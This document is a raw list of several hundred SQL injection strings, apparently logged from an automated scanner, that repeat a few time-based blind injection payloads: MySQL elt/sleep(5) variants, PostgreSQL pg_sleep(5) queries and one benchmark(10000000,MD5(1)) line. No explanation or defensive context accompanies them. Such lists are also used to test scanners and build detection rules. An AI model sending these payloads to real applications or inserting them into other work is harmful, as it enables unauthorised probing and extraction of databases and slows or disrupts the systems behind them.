+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
